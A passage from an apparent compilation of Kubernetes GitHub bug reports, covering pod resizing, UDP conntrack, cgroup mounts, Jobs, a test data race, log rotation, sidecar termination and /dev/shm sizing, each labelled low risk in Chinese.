ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux 6.5.0-41-generic #41~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Mon Jun  3 11:32:55 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
</details

#### Install tools

<details>
microk8s and openshift

```
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd://1.6.28
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

no


### 分析结果

低风险

---

## Issue #126033 [FG:InPlacePodVerticalScaling] Infeasible resize is actuated by restarting container

- Issue 链接：[#126033](https://github.com/kubernetes/kubernetes/issues/126033)

### Issue 内容

#### What happened?

If a container is restarted along with an exit while its resizing is stuck in `Infeasible` or `Deferred`, the unacceptable resizing is actuated:
1. Request an infeasible resize (exceeds node allocatable cpu):
    ```
   $ kubectl patch pod resize-pod --patch '{"spec":{"containers":[{"name":"resize-container", "resources":{"requests":{"cpu":"100"}, "limits":{"cpu":"100"}}}]}}'
   pod/resize-pod patched

    ```
2. Kill the container manually (`restartPolicy` is `Always`):
   ```
   $ kubectl exec resize-pod -- kill 1
   ```
3. Then, it looks still stuck in `Infeasible` or `Deferred` on the API pod status. However, the cgroup of the container is configured as requested:
   ```
   $ kubectl get pod resize-pod -o jsonpath='{.status.resize}'
   Infeasible
   ```
   ```
   $ kubectl exec resize-pod -- cat /sys/fs/cgroup/cpu.max
   10000000 100000
   # 10000000 = newLimit(100) * 1000mCPU * period(100000) / 1000mCPU
   ```
   ```
   $ kubectl exec resize-pod -- cat /sys/fs/cgroup/cpu.weight
   3906
   # 3906 = ((newRequest(100) * 1000mCPU * SharesPerCPU(1024) / 1000mCPU) - 2 ) * 9999 / 262142
   ```

However, it does not seem that this issue affects actual resource consumption. Because the pod cgroup is not updated in this case, the container resource will keep limited. In addition, since `AllocatedResources` in the container is not updated, this infeasible resizing will not affect the pod resource calculation of the scheduler.

#### What did you expect to happen?

This killed container is restarted with the old spec.


#### How can we reproduce it (as minimally and precisely as possible)?

1. Enable `InPlacePodVerticalScaling`.
2. Create a pod whose restartPolicy is `Always`:
    <details>

   ```
   apiVersion: v1
   kind: Pod
   metadata:
     creationTimestamp: null
     labels:
       run: resize-pod
     name: resize-pod
   spec:
     containers:
     - image: busybox
       name: resize-container
       command:
         - sh
         - -c
         - trap "exit 0" SIGTERM; while true; do sleep 1; done
       resources:
         requests:
           cpu: 200m
           memory: 200Mi
         limits:
           cpu: 200m
           memory: 200Mi
       resizePolicy:
       - resourceName: cpu
         restartPolicy: NotRequired
       - resourceName: memory
         restartPolicy: NotRequired
     restartPolicy: Always
   ```

    </details>
3. Request an infeasible resize:
   ```
   kubectl patch pod resize-pod --patch '{"spec":{"containers":[{"name":"resize-container", "resources":{"requests":{"cpu":"100"}, "limits":{"cpu":"100"}}}]}}'
   ```
4. Kill the container:
   ```
   kubectl exec resize-pod -- kill 1
   ```

   

#### Anything else we need to know?

By executing `kubectl get --watch`, we can see the resized status in a moment:
```
$ kubectl get pod resize-pod -o jsonpath='spec: {.spec.containers[0].resources}{"\nallocatedResources: "}{.status.containerStatuses[0].allocatedResources}{"\nstatus: "}{.status.containerStatuses[0].resources}{"\nresize: "}{.status.resize}{"\n"}' -w
spec: {"limits":{"cpu":"100","memory":"200Mi"},"requests":{"cpu":"100","memory":"200Mi"}}
allocatedResources: {"cpu":"200m","memory":"200Mi"}
status: {"limits":{"cpu":"100","memory":"200Mi"},"requests":{"cpu":"100","memory":"200Mi"}}  # <- See this line
resize: 
spec: {"limits":{"cpu":"100","memory":"200Mi"},"requests":{"cpu":"100","memory":"200Mi"}}
allocatedResources: {"cpu":"200m","memory":"200Mi"}
status: {"limits":{"cpu":"200m","memory":"200Mi"},"requests":{"cpu":"200m","memory":"200Mi"}}
resize: Infeasible
```

The resized pod status is set here:
https://github.com/kubernetes/kubernetes/blob/37f733a657ef71d66177d00f9b7d47ec507dedd3/pkg/kubelet/kubelet.go#L1802
However, the pod status is overwritten with an old pod status immediately here:
https://github.com/kubernetes/kubernetes/blob/37f733a657ef71d66177d00f9b7d47ec507dedd3/pkg/kubelet/kubelet.go#L2820

This issue is mentioned in another issue: https://github.com/kubernetes/kubernetes/issues/125205#issuecomment-2143532151


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.6
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```
</details>


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #125979 Dropped UDP packets on pod restart

- Issue 链接：[#125979](https://github.com/kubernetes/kubernetes/issues/125979)

### Issue 内容

#### What happened?

We are seeing occasional instances where a pod receiving UDP packets is
restarted and the new pod doesn't receive packets. The packets are still
being sent by the sending pods, but are being blackholed.

Specifically, there are two pods sending UDP packets to a ClusterIP service.
The UDP source port is not randomized.  The ClusterIP service is backed by two
pods where only one is Ready at a given time (managed by leader election). When
the receiving pod that is leader is deleted (gracefully), most of the time
traffic flows correctly from the two sending pods to the new leader. However
about every 4/5 restarts, one or more of the sending pods starts blackholing
traffic.

This is evidenced by the following kube-proxy logs from the nodes where the
sending pod is running. The following captures were taken at the same time from
two different nodes. A node that did cleanup conntrack entries:

[GOOD.txt](https://github.com/user-attachments/files/16145882/GOOD.txt)

And a node that did not clean up conntrack entries:

[BAD.txt](https://github.com/user-attachments/files/16145901/BAD.txt)

On one of these occurances we were able to validate that conntrack entries were
left and cleaning them up manually allowed traffic to flow:
```
conntrack -D -p udp --dport 6858 -r 172.18.209.67
udp      17 29 src=172.18.203.201 dst=10.32.216.47 sport=6852 dport=6858 [UNREPLIED] src=172.18.209.67 dst=172.18.203.201 sport=6858 dport=6852 mark=0 use=1
conntrack v1.4.7 (conntrack-tools): 1 flow entries have been deleted.
```

In addition to pod restarts, we have seen other cases leading to blackholing of
UDP traffic but don't have clear reproducers for these scenarios yet.

#### What did you expect to happen?

We expect that when a pod is deleted, its traffic is moved to the new pod. This happens most of the time.


#### How can we reproduce it (as minimally and precisely as possible)?

Deploy sender and receiver manifests from
https://github.com/muff1nman/leader-election-udp. Make one sender pod ready
such that the deployment rolls out:

```
kubectl exec -it receiver-8696979cd6-sj2bp -- bash -c "echo yes > /var/run/udplisten/ready"
```

Then you should have the following:
```
$ kubectl get pod
NAME                        READY   STATUS    RESTARTS   AGE
receiver-8696979cd6-klpgj   10/10   Running   0          3m3s
receiver-8696979cd6-t88dp   0/10    Running   0          48s
sender-744d8d5dd-qh5j2      1/1     Running   0          93s
```

Verify the logs of the sender are as expected:

```
$ kubectl logs -f deploy/sender
sending hello : 2024-07-09T15:16:52+00:00
ack from receiver-8696979cd6-2kkzj-1100
sending hello : 2024-07-09T15:16:53+00:00
ack from receiver-8696979cd6-2kkzj-1101
sending hello : 2024-07-09T15:16:54+00:00
ack from receiver-8696979cd6-2kkzj-1102
sending hello : 2024-07-09T15:16:55+00:00
```

This is the expected good state.

Now run `test.sh` to attempt getting traffic from the sender blackholed. There
are still unknowns as to the exact requirements for timing, so it might take a
couple tries. In my environment it happens about a third of the time. Between
attempts make sure pods are fully running (no ContainerCreating). A successful
trigger then looks like this:

```
ack from receiver-8696979cd6-lc8sg-1100
sending hello : 2024-07-09T15:15:17+00:00
ack from receiver-8696979cd6-lc8sg-1101
sending hello : 2024-07-09T15:15:18+00:00
ack from receiver-8696979cd6-lc8sg-1102
sending hello : 2024-07-09T15:15:19+00:00
ack from receiver-8696979cd6-lc8sg-1103
sending hello : 2024-07-09T15:15:20+00:00
sending hello : 2024-07-09T15:15:21+00:00
sending hello : 2024-07-09T15:15:22+00:00
sending hello : 2024-07-09T15:15:23+00:00
sending hello : 2024-07-09T15:15:24+00:00
sending hello : 2024-07-09T15:15:25+00:00
sending hello : 2024-07-09T15:15:26+00:00
sending hello : 2024-07-09T15:15:27+00:00
sending hello : 2024-07-09T15:15:28+00:00
sending hello : 2024-07-09T15:15:29+00:00
sending hello : 2024-07-09T15:15:30+00:00
sending hello : 2024-07-09T15:15:31+00:00
sending hello : 2024-07-09T15:15:32+00:00
sending hello : 2024-07-09T15:15:33+00:00
sending hello : 2024-07-09T15:15:34+00:00
sending hello : 2024-07-09T15:15:35+00:00
sending hello : 2024-07-09T15:15:36+00:00
sending hello : 2024-07-09T15:15:37+00:00
sending hello : 2024-07-09T15:15:38+00:00
sending hello : 2024-07-09T15:15:39+00:00
sending hello : 2024-07-09T15:15:40+00:00
sending hello : 2024-07-09T15:15:41+00:00
sending hello : 2024-07-09T15:15:42+00:00
sending hello : 2024-07-09T15:15:43+00:00
sending hello : 2024-07-09T15:15:44+00:00
sending hello : 2024-07-09T15:15:45+00:00
sending hello : 2024-07-09T15:15:46+00:00
sending hello : 2024-07-09T15:15:47+00:00
sending hello : 2024-07-09T15:15:48+00:00
sending hello : 2024-07-09T15:15:49+00:00
sending hello : 2024-07-09T15:15:50+00:00
sending hello : 2024-07-09T15:15:51+00:00
sending hello : 2024-07-09T15:15:53+00:00
sending hello : 2024-07-09T15:15:55+00:00
sending hello : 2024-07-09T15:15:57+00:00
sending hello : 2024-07-09T15:15:59+00:00
sending hello : 2024-07-09T15:16:01+00:00
sending hello : 2024-07-09T15:16:03+00:00
sending hello : 2024-07-09T15:16:05+00:00
sending hello : 2024-07-09T15:16:07+00:00
sending hello : 2024-07-09T15:16:09+00:00
```

Even though one of the pods is Ready to receive traffic. A reschedule of the sender pod gets things flowing again as well as manually cleaning up connntrack entries.



#### Anything else we need to know?

Potentially related:
* https://github.com/kubernetes/kubernetes/pull/106163
* https://github.com/kubernetes/kubernetes/issues/106274


#### Kubernetes version

<details>

```console
v1.30.1
```

</details>


#### Cloud provider

<details>
Baremetal
</details>


#### OS version

<details>

```
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

```
uname -a
Linux 36com699 6.6.34-cloudflare-2024.6.2 #1 SMP PREEMPT_DYNAMIC Mon Sep 27 00:00:00 UTC 2010 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
cri-o 1.30.2-1
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico v3.27.3
</details>


### 分析结果

低风险

---

## Issue #125943 kubelet read wrong cgroup mountpoint while startup, would always kill pods while the cgoup mountpoint disappears

- Issue 链接：[#125943](https://github.com/kubernetes/kubernetes/issues/125943)

### Issue 内容

#### What happened?

1. the minion installed kaspersky(kesl.service)
2.  the kaspersky would add a cpu cgoup mountpoint after  /sys/fs/cgroup/cpu
```
25 18 0:20 / /sys/fs/cgroup ro,nosuid,nodev,noexec shared:8 - tmpfs tmpfs ro,mode=755
26 25 0:21 / /sys/fs/cgroup/systemd rw,nosuid,nodev,noexec,relatime shared:9 - cgroup cgroup rw,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd
27 18 0:22 / /sys/fs/pstore rw,nosuid,nodev,noexec,relatime shared:20 - pstore pstore rw
28 25 0:23 / /sys/fs/cgroup/blkio rw,nosuid,nodev,noexec,relatime shared:10 - cgroup cgroup rw,blkio
29 25 0:24 / /sys/fs/cgroup/cpuset rw,nosuid,nodev,noexec,relatime shared:11 - cgroup cgroup rw,cpuset
30 25 0:25 / /sys/fs/cgroup/devices rw,nosuid,nodev,noexec,relatime shared:12 - cgroup cgroup rw,devices
31 25 0:26 / /sys/fs/cgroup/perf_event rw,nosuid,nodev,noexec,relatime shared:13 - cgroup cgroup rw,perf_event
32 25 0:27 / /sys/fs/cgroup/hugetlb rw,nosuid,nodev,noexec,relatime shared:14 - cgroup cgroup rw,hugetlb
33 25 0:28 / /sys/fs/cgroup/cpu,cpuacct rw,nosuid,nodev,noexec,relatime shared:15 - cgroup cgroup rw,cpuacct,cpu
34 25 0:29 / /sys/fs/cgroup/net_cls,net_prio rw,nosuid,nodev,noexec,relatime shared:16 - cgroup cgroup rw,net_prio,net_cls
35 25 0:30 / /sys/fs/cgroup/pids rw,nosuid,nodev,noexec,relatime shared:17 - cgroup cgroup rw,pids
36 25 0:31 / /sys/fs/cgroup/freezer rw,nosuid,nodev,noexec,relatime shared:18 - cgroup cgroup rw,freezer
37 25 0:32 / /sys/fs/cgroup/memory rw,nosuid,nodev,noexec,relatime shared:19 - cgroup cgroup rw,memory
248 24 0:28 / /run/cgroups/cpu rw,relatime shared:38 - cgroup none rw,cpuacct,cpu
```
3. the kubelet startup, would read the /run/cgroups/cpu as the cpu cgroup root path, as it's shorter than  /sys/fs/cgroup/cpu, introduced by this pr(https://github.com/kubernetes/kubernetes/pull/96594)

![CjYS1WaHPo-AWvp6AACy5LvHEkU080](https://github.com/kubernetes/kubernetes/assets/18046309/eaa9d717-59b5-4719-9950-918f3a66f2e3)

4. then if stop the kesl service,   the /run/cgroups/cpu mountpoint would be umounted and disappeared
5.  the kubelet would always kill pods when syncing pod and check cgroup not exists
![2024-07-08_112118](https://github.com/kubernetes/kubernetes/assets/18046309/8ae32fc8-b1bc-4629-9481-d601d64985a4)


#### What did you expect to happen?

kubelet should prioritize using the subsystem cgroups read first, unless the lastest one is the prefix of the previous,  we should not always read the shortest as the sys/fs/cgroup should be correct generally 

#### How can we reproduce it (as minimally and precisely as possible)?

see what happened

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
kubernetes v1.28.11
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #125909 Job terminates when FailureTarget=False condition is added manually

- Issue 链接：[#125909](https://github.com/kubernetes/kubernetes/issues/125909)

### Issue 内容

#### What happened?

When the FailureTarget=False condition is added manually, then the Job terminates.

#### What did you expect to happen?

The condition should be ignored by the Job controller.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Prepare the `job.yaml` like this:
```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: test-job
spec:
  template:
    spec:
      containers:
      - name: test-container
        image: busybox
        command: ["sleep", "3m"]
      restartPolicy: Never
```
2. Run the following script to repro:
```sh
kubectl create -f job.yaml

NAMESPACE=${NAMESPACE:-default}
JOB_NAME=${JOB_NAME:-test-job}

kubectl wait --for=jsonpath='{.status.ready}'=1 job $JOB_NAME -n $NAMESPACE

JOB_JSON=$(kubectl get job $JOB_NAME -n $NAMESPACE -o json)

UPDATED_JOB_JSON=$(echo $JOB_JSON | jq --arg type "FailureTarget" \
                                         --arg status "False" \
                                         --arg reason "ManualUpdateByScript" \
'.status.conditions += [{"type": $type, "status": $status, "reason": $reason, "lastTransitionTime": (now | strftime("%Y-%m-%dT%H:%M:%SZ"))}]')

kubectl patch job $JOB_NAME -n $NAMESPACE --patch "$UPDATED_JOB_JSON" --subresource='status'
```

**Issue**: the Job gets terminated with the status like this:

```
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2024-07-05T09:29:38Z"
      reason: ManualUpdateByScript
      status: "False"
      type: FailureTarget
    - lastProbeTime: "2024-07-05T09:29:39Z"
      lastTransitionTime: "2024-07-05T09:29:39Z"
      reason: ManualUpdateByScript
      status: "True"
      type: Failed
    failed: 1
    ready: 1
    startTime: "2024-07-05T09:29:35Z"
    terminating: 0
    uncountedTerminatedPods: {}
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.28.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.2
WARNING: version difference between client (1.28) and server (1.30) exceeds the supported minor version skew of +/-1
```

</details>


#### Cloud provider

<details>
Kind
</details>


#### OS version

<details>



</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #125904 portforward test: race condition

- Issue 链接：[#125904](https://github.com/kubernetes/kubernetes/issues/125904)

### Issue 内容

#### What happened?

I ran https://github.com/kubernetes/kubernetes/pull/116980 ("make test-integration" with race detection) and it [found](https://prow.k8s.io/view/gs/kubernetes-jenkins/pr-logs/pull/116980/pull-kubernetes-integration/1808940570375098368) this:

```
WARNING: DATA RACE
Write at 0x00c00901bdd0 by goroutine 4387:
  bytes.(*Buffer).grow()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/bytes/buffer.go:151 +0x2d3
  bytes.(*Buffer).Write()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/bytes/buffer.go:179 +0xc4
  fmt.Fprintf()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/fmt/print.go:225 +0xab
  k8s.io/client-go/tools/portforward.(*PortForwarder).handleConnection()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/portforward/portforward.go:339 +0x19d
  k8s.io/client-go/tools/portforward.(*PortForwarder).waitForConnection.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/portforward/portforward.go:320 +0x6b

Previous read at 0x00c00901bdd0 by goroutine 120:
  bytes.(*Buffer).String()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/bytes/buffer.go:71 +0x18f7
  k8s.io/kubernetes/test/integration/apiserver/portforward.TestPortforward()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/portforward/portforward_test.go:153 +0x18d1
  testing.tRunner()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:1689 +0x21e
  testing.(*T).Run.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:1742 +0x44

Goroutine 4387 (running) created at:
  k8s.io/client-go/tools/portforward.(*PortForwarder).waitForConnection()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/portforward/portforward.go:320 +0x84
  k8s.io/client-go/tools/portforward.(*PortForwarder).listenOnPortAndAddress.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/portforward/portforward.go:277 +0x6b

Goroutine 120 (running) created at:
  testing.(*T).Run()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:1742 +0x825
  testing.runTests.func1()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:2161 +0x85
  testing.tRunner()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:1689 +0x21e
  testing.runTests()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:2159 +0x8be
  testing.(*M).Run()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:2027 +0xf17
  testing.(*M).Run-fm()
      <autogenerated>:1 +0x33
  k8s.io/kubernetes/test/integration/framework.EtcdMain()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/framework/etcd.go:224 +0x656
  k8s.io/kubernetes/test/integration/apiserver/portforward.TestMain()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/portforward/main_test.go:26 +0x31e
  main.main()
      _testmain.go:49 +0x2d0
```

#### What did you expect to happen?

No race.

#### How can we reproduce it (as minimally and precisely as possible)?

Run the test with `go test -race`.


#### Anything else we need to know?

_No response_

#### Kubernetes version

master

#### Cloud provider

n/a

#### OS version

_No response_

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #125900 Missing log entries during massive json based logs (logrotate kubelet stdout)

- Issue 链接：[#125900](https://github.com/kubernetes/kubernetes/issues/125900)

### Issue 内容

#### What happened?

We've been running Load Tests for quite a while using normal text based logs to stdout, when our team has rewritten the log framework to use a lot of details and started using json, we began to receive missing logs, about 50 out of every 50 million log entries, also each log entry size grew from 10s/100s of bytes to 3k-4.5kbytes.
The set up is of several applications, they use normal HPA with CPU for most, and the main 2 applications are scaled beforehand to about 50 replicas, and those 2 applications produce most of the workload and logs, we use AWS EKS.
I have verified with fluentd, datadog agents and kubectl logs and stern that the missing logs are consistent.
I have also created mount volumes for each pod to save logs using "| tee -a file.log" to /var/tmp folder with large storage nodes and all logs were in place while some from stdout were missing.
We have identified that it is probably somewhere between the kubelet taking the logs from stdout and writing them to the log file while logrotate happens.
The logging configuration is default, 10MB per log, single worker, 5 files.
The main 2 applications with 50 replicas, create about 10MB of log per minute per container log.
The problem started when we were running kubernetes version 1.26, but we also tested it with 1.28 and 1.29, also 1.29 provided me the fix for kubectl logs to tail the logs.

#### What did you expect to happen?

Logs not to be missing.
Also maybe the ability to update the logrotate method if it is copytruncate, update to create or visaversa

#### How can we reproduce it (as minimally and precisely as possible)?

I think that if POD creates large log entries close to 5KB each, with high rate of about 10MB per minute it can be reproduced within 3 to 3.5 hours.

#### Anything else we need to know?

I am doing another test with very large nodes and will instruct the logmaxsize to 20Gi which gives me about 3 hours of Load test when spanned across 6 large nodes.
We will also upgrade to 1.30 and test.
The automation team created Log verification process with Datadog (dd api) and Cloudwatch (fluentbit) using correlationid entry for every generated flow, that way we can say that logs are missing, with that info we can actually go to the captured logs by kubectl logs cli or DD or Cloudwatch and actually see that.
We didn't see missing logs with small no-json log entries ~100bytes

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
kubectl version --output=yaml
clientVersion:
  buildDate: "2024-06-11T20:29:44Z"
  compiler: gc
  gitCommit: 39683505b630ff2121012f3c5b16215a1449d5ed
  gitTreeState: clean
  gitVersion: v1.30.2
  goVersion: go1.22.4
  major: "1"
  minor: "30"
  platform: darwin/arm64
kustomizeVersion: v5.0.4-0.20230601165947-6ce0bf390ce3
serverVersion:
  buildDate: "2024-04-30T23:53:58Z"
  compiler: gc
  gitCommit: 9c0e57823b31865d0ee095997d9e7e721ffdc77f
  gitTreeState: clean
  gitVersion: v1.29.4-eks-036c24b
  goVersion: go1.21.9
  major: "1"
  minor: 29+
  platform: linux/amd64
</details>


#### Cloud provider

<details>
es
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```
Amazon AL2_x86_64
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

containerd | 1.7.11-1.amzn2.0.1
-- | --

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details> 
    addon_name        = "coredns"
    addon_version     = "v1.11.1-eksbuild.4"
    addon_name        = "kube-proxy"
    addon_version     = "v1.29.0-eksbuild.1"
    addon_name        = "vpc-cni"
    addon_version     = "v1.16.0-eksbuild.1"
    addon_name         = "aws-ebs-csi-driver"
    version            = "v1.31.0-eksbuild.1"
</details>


### 分析结果

低风险

---

## Issue #125880 Termination signals not sent to Native Sidecars when multiple Native Sidecars

- Issue 链接：[#125880](https://github.com/kubernetes/kubernetes/issues/125880)

### Issue 内容

#### What happened?

In a situation where during the init phase of a `Pod`, a native sidecar never becomes ready (because its `startupProbe` is failing), then the `Pod` is terminated, if there are multiple startup containers, a termination signal is never received by the init container and the Pod is stuck (until `terminationGracePeriodSeconds` is hit).

#### What did you expect to happen?

All running initContainer to receive the termination signal correctly.  

#### How can we reproduce it (as minimally and precisely as possible)?

Create a `Dockerfile` with this bash script as an entrypoint:

```
#!/bin/bash
set -e 
trap 'echo "saw an exit signal"; sleep 5; exit' EXIT

while true; do
  echo "hello"
  sleep 1
done
```

Create a deployment with two init containers (one normal one sidecar).  Add an probe which means the startupProbe never passes

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: karl-test-deployment
spec:
  replicas: 1
  selector:
    matchLabels:
      app2: karl-test
  template:
    metadata:
      labels:
        app2: karl-test 
    spec:
      securityContext:
        seccompProfile:
          type: RuntimeDefault
      terminationGracePeriodSeconds: 600
      initContainers:
      - name: init-1
        image: eu.gcr.io/at-artefacts/karl-test
        imagePullPolicy: IfNotPresent
        command: ["sh", "-c", "echo 'init container 1'"]
      - name: init-2
        image: eu.gcr.io/at-artefacts/karl-test
        imagePullPolicy: IfNotPresent
        restartPolicy: Always 
        startupProbe:                                                                                                                                                                                                          
          failureThreshold: 600 
          httpGet:
            path: /whatever
            port: 1234
            scheme: HTTP
          periodSeconds: 1
          successThreshold: 1
          timeoutSeconds: 3
      containers:
      - name: karl-test
        image: eu.gcr.io/at-artefacts/karl-test
        imagePullPolicy: IfNotPresent
```

Create the deployment, and it'll be stuck in Init, as you'd expect:

```
karl-test-deployment-c979948d8-xghf4   0/2     Init:1/2   0          5s
```

`kubectl delete` the pod and you'll see the exit signal has been sent to `init-2`:
```
hello
hello
hello
saw an exit signal
```

Delete the deployment / clean everything up.  Now, add a third `initContainer`:

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: karl-test-deployment
spec:
  replicas: 1
  selector:
    matchLabels:
      app2: karl-test
  template:
    metadata:
      labels:
        app2: karl-test 
    spec:
      securityContext:
        seccompProfile:
          type: RuntimeDefault
      terminationGracePeriodSeconds: 600
      initContainers:
      - name: init-1
        image: eu.gcr.io/at-artefacts/karl-test
        imagePullPolicy: IfNotPresent
        command: ["sh", "-c", "echo 'init container 1'"]
      - name: init-2
        image: eu.gcr.io/at-artefacts/karl-test
        imagePullPolicy: IfNotPresent
        restartPolicy: Always 
        startupProbe:                                                                                                                                                                                                          
          failureThreshold: 600 
          httpGet:
            path: /whatever
            port: 1234
            scheme: HTTP
          periodSeconds: 1
          successThreshold: 1
          timeoutSeconds: 3
      - name: init-3
        image: eu.gcr.io/at-artefacts/karl-test
        imagePullPolicy: IfNotPresent
        restartPolicy: Always 
        startupProbe:                                                                                                                                                                                                          
          failureThreshold: 600 
          httpGet:
            path: /whatever
            port: 1234
            scheme: HTTP
          periodSeconds: 1
          successThreshold: 1
          timeoutSeconds: 3
      containers:
      - name: karl-test
        image: eu.gcr.io/at-artefacts/karl-test
        imagePullPolicy: IfNotPresent
```

As before, the `init` process will be stuck on `init-2` because of the bad probe:
```
karl-test-deployment-5c547f8f86-s8nqh   0/3     Init:1/3   0          1s
```

However when you delete the pod this time, no exit signal is sent to `init-2`, the pod is now stuck until `terminationGracePeriodSeconds` is reached.

#### Anything else we need to know?

_No response_

#### Kubernetes version

```
Client Version: v1.28.5
Server Version: v1.29.4-gke.1043002
```

#### Cloud provider

GKE v1.29.4-gke.1043002

#### OS version

Core OS on GCP

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #125852 /dev/shm can be oversubscribed compared to host

- Issue 链接：[#125852](https://github.com/kubernetes/kubernetes/issues/125852)

### Issue 内容

Hi! I noticed that when we create the emptyDir and specify [Memory as the storage medium](https://github.com/kubernetes/kubernetes/blob/ff8834cdd7abb9a2975f20dffb575d7f00a1d4d3/pkg/volume/emptydir/empty_dir.go#L150) and allow to calculate the sizeLimit "to match the host" - it does so based on the pod resource spec, [here](https://github.com/kubernetes/kubernetes/blob/ff8834cdd7abb9a2975f20dffb575d7f00a1d4d3/pkg/volume/emptydir/empty_dir.go#L122-L132).  I was testing this on an AWS hpc7g instance, which has 64 GB in `/dev/shm` (on the host) and the entire host has 128GB:

![image](https://github.com/kubernetes/kubernetes/assets/814322/d1e6d83b-db58-408b-8b45-7d3de12d4b6c)

And I was really surprised to see that my `/dev/shm` in the container was also 128GB. I think more properly it should match what the host is given, 64GB, because otherwise I think it might be the case we can oversubscribe? I'm worried about the implications of this. My questions are thus:

1. Was this decision intentional (and if not, is this a bug we can fix)
2. If the decision was intentional, how does that work? 

And either way, what are the implications for oversubscription?

Thanks for the feedback! I'm also really grateful for this feature - I was really surprised to see how tiny the default `/dev/shm` is created by docker and containerd (one was like 64M if I remember correctly)!

